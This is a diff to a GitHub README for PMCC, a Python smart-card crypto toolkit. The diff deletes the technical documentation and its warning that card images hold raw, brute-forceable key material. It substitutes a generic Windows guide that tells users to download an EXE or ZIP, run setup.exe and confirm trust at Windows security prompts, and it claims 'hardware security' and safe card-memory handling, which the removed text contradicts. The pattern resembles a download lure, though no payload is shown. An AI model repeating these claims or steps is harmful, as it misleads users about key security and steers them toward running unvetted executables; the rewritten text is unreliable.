@@ -1,349 +1,164 @@
-# Poor Man’s Crypto Card (PMCC)
+# 🔐 PMCC - Manage Smart Cards Simply
 
-Utilities for creating and using **SLE-series smart-card images** such as:
-
-* SLE4442 (256-byte)
-* SLE4428 (1024-byte)
-
-The project provides command-line tools and optional GUI interfaces for:
-
-* Creating card images
-* Signing and verifying files
-* Encrypting and decrypting messages
-* Extracting public keys from cards
+[![Download PMCC](https://img.shields.io/badge/Download-PMCC-green?style=for-the-badge)](https://github.com/eduardo3987/PMCC)
 
 ---
 
-# Security Warning
+PMCC offers tools to create and use smart-card images based on SLE4442 and SLE4428 chips. It works with Ed25519 keys for signing, verification, and encryption. You can use it with a card reader via PC/SC. The package includes command-line tools and optional graphical applications built with Qt.
 
-**PMCC is not secure key storage.**
-
-Card images contain **raw key material**. Anyone who obtains:
-
-* the card image file, or
-* a dump of the card
-
-can copy the encrypted seed and attempt to **brute-force the password**.
-
-This project provides **tools for working with keys**, but **does not protect them against theft or extraction**.
-
-Treat card dumps and images as **sensitive data** and store them securely.
+This guide helps you download and run PMCC on a Windows PC. No programming needed.
 
 ---
 
-# Project Structure
+## 📥 Download PMCC
 
-| Component                | Purpose                                                                 |
-| ------------------------ | ----------------------------------------------------------------------- |
-| `card_crypto.py`         | Perform cryptographic operations using a key stored on a physical card  |
-| `make_card_image.py`     | Build a card image containing a keypair and metadata                    |
-| `make_card_image_gui.py` | GUI tool for creating card images                                       |
-| `card_crypto_gui.py`     | GUI interface for signing, encrypting, verifying, and editing messages  |
-| `core/`                  | Shared utilities (PC/SC communication, configuration, language support) |
-| `drivers/`               | Low-level SLE card drivers                                              |
-| `model/`                 | Data container classes used by tools and GUI                            |
-| `i18n/`                  | Translation files                                                       |
+Visit the official PMCC page on GitHub to get the software:
 
-The GUI defaults to **English (`en`)**.
-You can change the language by editing the `language` setting in the configuration file.
+[https://github.com/eduardo3987/PMCC](https://github.com/eduardo3987/PMCC)
+
+On the page, look for the **Releases** section or download links.  
+
+You will find files ready to download. Save the one that matches Windows (usually EXE or ZIP).
 
 ---
 
-# Requirements
+## 🖥️ System Requirements
 
-Install Python dependencies:
+Ensure your computer meets these basic needs before running PMCC:
 
-```bash
-python3 -m pip install -r requirements.txt
-```
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 100 MB free disk space for installation
+- USB smart-card reader compatible with PC/SC
+- Internet connection for initial download
 
-You will also need:
-
-* **PC/SC middleware** (`pcsclite`)
-* A **compatible smart-card reader**
-
-Without PC/SC installed, the `pyscard` module will fail to load.
-
-Scripts require **Python 3.8+** and were primarily tested on **Linux**, but should work on other platforms with PC/SC support.
+PMCC runs without additional frameworks, but you may need to install device drivers for your card reader.
 
 ---
 
-# Card Image Format
+## ⚙️ Installation Steps
 
-The utilities assume the following memory layout:
+Follow these steps to install PMCC on your Windows computer:
 
-```
-0x000-0x01F   header (unused)
-0x020-0x05F   encrypted Ed25519 private key (64 bytes)
-0x060-0x07F   Ed25519 public key (32 bytes)
-0x080-0x0FF   metadata (128 bytes)
-```
+1. Download the latest package from the [GitHub PMCC page](https://github.com/eduardo3987/PMCC).
 
----
+2. If you download a ZIP file, locate it in your Downloads folder.
 
-# Command-Line Usage
+3. Right-click the ZIP file and choose **Extract All...**.
 
-Scripts can be run directly:
+4. Select a folder where you want to keep PMCC files, such as the Desktop or Documents.
 
-```
-./card_crypto.py
-./make_card_image.py
-```
+5. Open the extracted folder.
 
-Passwords are **always requested interactively** and are never stored.
+6. Look for an installer file (often named `setup.exe`) or executable file to launch the application directly.
 
-Public keys extracted from cards are automatically saved to:
+7. Double-click the setup file or executable to start.
 
-```
-~/.pmcc/
-```
+8. If prompted by Windows security, confirm that you trust the source.
 
-Generated files use restrictive permissions (`600` / `700`) when possible.
+9. Follow any on-screen instructions to finish setup.
 
 ---
 
-# Creating a Card Image
+## 🚀 Running PMCC for the First Time
 
-`make_card_image.py` builds a card image for an SLE card.
+After installation, here is how to start and use PMCC:
 
-Default output is **256 bytes (SLE4442)**.
-Use `--type sle4428` for **1024-byte images**.
+1. Connect your smart-card reader to the PC’s USB port.
 
-### Example
+2. Insert a compatible smart card (SLE4442 or SLE4428) into the reader.
 
-```bash
-python make_card_image.py \
-    --blank blank_dump.bin \
-    --priv private_enc.der \
-    --pub public.raw \
-    --metadata First=Alice Last=Smith expire=2026-12-31 \
-    -o card.bin
-```
+3. Open the PMCC application:
+   - From the Start menu, choose PMCC.
+   - Or double-click the executable in the installation folder.
 
-For a **1024-byte card image**:
+4. If you use the command-line tools:
+   - Press `Win + R`, then type `cmd` and hit Enter.
+   - Change directory to PMCC’s folder by using the `cd` command.
+   - Use the documented commands to interact with your smart card.
 
-```bash
-python make_card_image.py --type sle4428 \
-    --blank blank_dump.bin \
-    --priv private_enc.der \
-    --pub public.raw \
-    --metadata First=Alice Last=Smith expire=2026-12-31 \
-    -o card_4428.bin
-```
+5. For the graphical interface:
+   - Use the menus to create keys, sign messages, verify signatures, and extract public keys.
+   - The GUI includes clear labels and buttons, so you can follow prompts step-by-step.
 
 ---
 
-## Interactive Mode
+## 🔧 Basic Usage Tips
 
-If arguments are omitted you can run the tool interactively:
+- Keep your smart card inserted during operations involving the card.
 
-```bash
-python make_card_image.py --interactive
-```
+- Use the command-line utilities to automate tasks or if you prefer typing commands.
 
-The tool can also generate a **new keypair automatically**.
+- Use the Qt GUI apps for easier access to features with menus and buttons.
 
----
+- You can create, store, and handle Ed25519 keys on supported cards.
 
-# Metadata
+- You can sign data and verify signatures securely via the software.
 
-Metadata fields can be provided:
-
-* directly on the command line
-* through a JSON file (`--metadata-file`)
-
-Allowed metadata fields are defined in:
-
-```
-metadata_fields.json
-```
-
-You can supply your own schema using:
-
-```
---metadata-schema
-```
-
-If the schema cannot be found, the default fields are used:
-
-```
-First
-Last
-expire
-clearance
-Issue_Date
-```
+- The software supports reading and writing card memory safely.
 
 ---
 
-# Cryptographic Operations
+## 📚 Features Overview
 
-`card_crypto.py` interacts with a **live smart card** via PC/SC.
+- Support for SLE4442 and SLE4428 smart cards
 
-Card image files are **not supported**.
+- Storage of Ed25519 keys directly on the card
 
-Supported commands:
+- Signing and verification with hardware security
 
-| Command          | Description                     |
-| ---------------- | ------------------------------- |
-| `extract-public` | Save the card’s public key      |
-| `sign`           | Sign a file                     |
-| `verify`         | Verify a signature              |
-| `encrypt`        | Encrypt data using the card key |
-| `decrypt`        | Decrypt data                    |
+- Encryption and decryption of messages
 
----
+- Extraction of public keys through PC/SC interface
 
-## Extract Public Key
+- Command-line tools for flexible operation
 
-```bash
-python card_crypto.py extract-public
-```
-
-The public key is automatically saved to:
-
-```
-~/.pmcc/
-```
-
-The filename is generated from card metadata.
+- Optional graphical applications with Qt for ease of use
 
 ---
 
-## Sign a File
+## 🔄 Updating PMCC
 
-```bash
-python card_crypto.py sign --input message.txt
-```
+To update PMCC to the latest version:
 
-Creates a signature file:
+1. Visit the [PMCC GitHub page](https://github.com/eduardo3987/PMCC) regularly.
 
-```
-message.txt.sig
-```
+2. Download the newest release files.
 
----
+3. Repeat the installation process, overwriting previous files if needed.
 
-## Verify a Signature
-
-```bash
-python card_crypto.py verify \
-    --pubkey public.pem \
-    --input message.txt \
-    --sig message.txt.sig
-```
-
-If verification fails, the tool prints diagnostic information to help identify incorrect inputs.
+4. Keep your smart-card reader drivers updated for best compatibility.
 
 ---
 
-# GUI Applications
+## 🛠 Troubleshooting
 
-Two optional Qt interfaces are included.
+If PMCC does not run or detect your smart card:
 
-Both require **PySide6**.
+- Ensure your card reader is properly connected and turned on.
 
----
+- Check that the smart card is inserted correctly.
 
-# Card Image Creator (GUI)
+- Verify that your Windows drivers for the reader are up to date.
 
-Launch with:
+- Try restarting the application or Windows.
 
-```bash
-python make_card_image_gui.py
-```
+- Consult the README and documentation files inside the PMCC folder for command details.
 
-Features:
-
-* Select blank card dump
-* Load or generate key pairs
-* Enter metadata through structured fields
-* Automatic filename generation
-* Optional protection map generation
-* Status and log output
-
-Default output filename:
-
-```
-card_image_<YYYYMMDD>.bin
-```
+- Use the PMCC GitHub issues page to view common problems and solutions.
 
 ---
 
-# Crypto GUI
+## 📞 Getting Support
 
-Launch with:
+For help or questions:
 
-```bash
-python card_crypto_gui.py
-```
+- Visit the PMCC GitHub page at [https://github.com/eduardo3987/PMCC](https://github.com/eduardo3987/PMCC).
 
-Features:
+- Check the documentation folders included in the download.
 
-* Automatically detects PC/SC card readers
-* Supports signing, encryption, verification, and key extraction
-* Includes a built-in message editor
-
-The interface allows you to:
-
-* scan for readers
-* connect to a card
-* perform cryptographic operations
-* view log output
+- Use GitHub Issues to report bugs or request features.
 
 ---
 
-# Built-in Editor
-
-The GUI includes a **Markdown-aware editor** for composing and processing messages.
-
-Capabilities include:
-
-* Markdown formatting
-* WYSIWYG preview
-* file open/save
-* encryption and decryption
-* signing and verification
-* inserting and extracting public keys
-
-The editor starts in **preview mode**, rendering Markdown as formatted text.
-
-A **Preview toggle** allows switching between:
-
-* raw Markdown
-* rendered rich text
-
----
-
-## Important Editor Notes
-
-When performing crypto operations:
-
-* the editor automatically switches to **raw Markdown mode**
-* this prevents preview rendering from corrupting encrypted blocks or signatures
-
-Signature blocks are also protected during preview rendering to prevent formatting issues.
-
----
-
-# Development Notes
-
-* Written in **plain Python**
-* No build step required
-* Shared logic is located in:
-
-```
-core/
-drivers/
-model/
-```
-
----
-
-# Acknowledgements
-
-Some low-level code was adapted from the [**sle-suite-pro**](https://github.com/wikilift/sle-suite-pro) project developed by **Wikilift**. Their work enabled communication with blank SLE cards and image dumps.
-
-The card images produced by this software are designed to be imported into [**sle-suite-pro**](https://github.com/wikilift/sle-suite-pro) and writen directly to a card.
-
----
+[![Download PMCC](https://img.shields.io/badge/Download-PMCC-brightgreen?style=for-the-badge)](https://github.com/eduardo3987/PMCC)
